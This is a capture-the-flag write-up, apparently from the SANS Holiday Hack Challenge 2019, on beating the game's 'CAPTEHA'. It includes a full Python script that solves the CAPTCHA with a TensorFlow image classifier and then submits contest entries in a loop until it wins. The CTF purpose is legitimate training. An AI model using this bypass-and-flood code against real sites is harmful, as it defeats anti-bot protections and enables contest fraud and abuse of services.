# 1. Primary Objectives
## 1.8. Bypassing the Frido Sleigh CAPTEHA
### 1.8.1. Description
Help Krampus beat the Frido Sleigh contest. For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room.
### 1.8.2. Solution
I thought about image recognition APIs and packages, initially developing a solution in python using imageai module but the success ratio and timing were not good enough.
Then I got the suggestion from Alabaster Snowball of watching the Machine Learning Use Cases for
Cyber Security talk and from there I borrowed the code.

I tried optimizing the code to improve performances but all computers I could use during these holidays were not able to perform the recognition in less than 13/14 seconds.

I discovered the Google Colab environment for TensorFlow, I uploaded the image I had classified in Google Drive and connected it to the Google Colab environment.

Using python3 as runtime and GPU as Hardware accelerator I was able to classify images as fast as
required.

I modified the retrain.py code adding a line to force the image_dir parameter:
```python
FLAGS.image_dir = "drive/My Drive/SANSChallenge2019/Reduced"
```

I modified the predict_images_using_trained_model.py to not read the images from a directory, this would allow to avoid the IO delays related to reading and writing the downloaded base64 images.

Then wrapping up this code with the capteha_api.py provided by Krampus, after some submissions the script was able to succeed and I received the email with the flag.
### 1.8.3. Flag
The flag is: ​**8Ia8LiZEwvyZr2WO​**.
### 1.8.4. Attachments
#### 1.8.4.1. Solveme.py
```python
#!/usr/bin/env python3
# Fridosleigh.com CAPTEHA API - Made by Krampus Hollyfeld
import requests
import json
import sys
import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
import tensorflow as tf
tf.logging.set_verbosity(tf.logging.ERROR)
import numpy as np
import threading
import queue
import time
import sys
import base64

def load_labels(label_file):
    label = []
    proto_as_ascii_lines = tf.gfile.GFile(label_file).readlines()
    for l in proto_as_ascii_lines:
        label.append(l.rstrip())
    return label

def predict_image(q, sess, graph, image_bytes, img_full_path, labels, input_operation, output_operation):
    image = read_tensor_from_image_bytes(image_bytes)
    results = sess.run(output_operation.outputs[0], {
        input_operation.outputs[0]: image
    })
    results = np.squeeze(results)
    prediction = results.argsort()[-5:][::-1][0]
    q.put( {'img_full_path':img_full_path, 'prediction':labels[prediction].title(), 'percent':results[prediction]} )

def load_graph(model_file):
    graph = tf.Graph()
    graph_def = tf.GraphDef()
    with open(model_file, "rb") as f:
        graph_def.ParseFromString(f.read())
    with graph.as_default():
        tf.import_graph_def(graph_def)
    return graph

def read_tensor_from_image_bytes(imagebytes, input_height=299, input_width=299, input_mean=0, input_std=255):
    image_reader = tf.image.decode_png( imagebytes, channels=3, name="png_reader")
    float_caster = tf.cast(image_reader, tf.float32)
    dims_expander = tf.expand_dims(float_caster, 0)
    resized = tf.image.resize_bilinear(dims_expander, [input_height, input_width])
    normalized = tf.divide(tf.subtract(resized, [input_mean]), [input_std])
    sess = tf.compat.v1.Session()
    result = sess.run(normalized)
    return result

def main():
    graph = load_graph('/tmp/retrain_tmp/output_graph.pb')
    labels = load_labels("/tmp/retrain_tmp/output_labels.txt")

    input_operation = graph.get_operation_by_name("import/Placeholder")
    output_operation = graph.get_operation_by_name("import/final_result")
    sess = tf.compat.v1.Session(graph=graph)
    q = queue.Queue()

    unknown_images = []

    yourREALemailAddress = "d10237689@urhen.com"

    # Creating a session to handle cookies
    s = requests.Session()
    url = "https://fridosleigh.com/"

    print ("SENDING REQUEST")
    data = s.get("https://fridosleigh.com/api/capteha/request").json()
    print ("GOT RESPONSE")

    for imageobj in data['images']:
        b64 = base64.b64decode(imageobj['base64'])
        uuid = imageobj['uuid']
        unknown_images.append(uuid)
        threading.Thread(target=predict_image, args=(q, sess, graph, b64, uuid, labels, input_operation, output_operation)).start()

    type1 = data['select_type'].split(", ")[0]
    type2 = data['select_type'].split(", ")[1]
    type3 = data['select_type'].split(", ")[2].split("and ")[1]

    print ("TYPES -> [{}] [{}] [{}]".format( type1, type2, type3))

    print('Waiting For Threads to Finish...')
    while q.qsize() < len(unknown_images):
        time.sleep(0.001)
    
    prediction_results = [q.get() for x in range(q.qsize())]

    answer = ""
    count1 = 0
    count2 = 0
    count3 = 0
    for prediction in prediction_results:
        print('TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy'.format(**prediction))
        if prediction['prediction'] == type1 or prediction['prediction'] == type2 or prediction['prediction'] == type3:
            answer += prediction['img_full_path'] + ","
            if prediction['prediction'] == type1:
                count1 += 1
            if prediction['prediction'] == type2:
                count2 += 1
            if prediction['prediction'] == type3:
                count3 += 1
    print ("Counts: Type[{}] [{}] | type[{}] [{}] | Type[{}] [{}])".format(type1, count1, type2, count2, type3, count3))
    print ("ANSWER -> " + answer[:-1])

    final_answer=answer[:-1]
    
    json_resp = json.loads(s.post("{}api/capteha/submit".format(url), data={'answer':final_answer}).text)
    if not json_resp['request']:
        # If it fails just run again. ML might get one wrong occasionally
        print('FAILED MACHINE LEARNING GUESS')
        print('--------------------\nOur ML Guess:\n--------------------\n{}'.format(final_answer))
        print('--------------------\nServer Response:\n--------------------\n{}'.format(json_resp['data']))
        sys.exit(1)

    print('CAPTEHA Solved!')
    # If we get to here, we are successful and can submit a bunch of entries till we win
    userinfo = {
        'name':'Krampus Hollyfeld',
        'email':yourREALemailAddress,
        'age':180,
        'about':"Cause they're so flippin yummy!",
        'favorites':'thickmints'
    }
    # If we win the once-per minute drawing, it will tell us we were emailed. 
    # Should be no more than 200 times before we win. If more, somethings wrong.
    entry_response = ''
    entry_count = 1
    while yourREALemailAddress not in entry_response and entry_count < 200:
        print('Submitting lots of entries until we win the contest! Entry #{}'.format(entry_count))
        entry_response = s.post("{}api/entry".format(url), data=userinfo).text
        entry_count += 1
    print(entry_response)


if __name__ == "__main__":
    main()
```
#### 1.8.4.2. Link to the Google Colab Notebook
https://colab.research.google.com/drive/1zgzsyn5m2GZZhQ1ND886LKy0KkgyOQj3
#### 1.8.4.3. Link to the Google Drive folder with custom training image set
https://drive.google.com/drive/folders/18DLpl7ghb-bgez7mc954UyTWQqGlVm9L?usp=sharing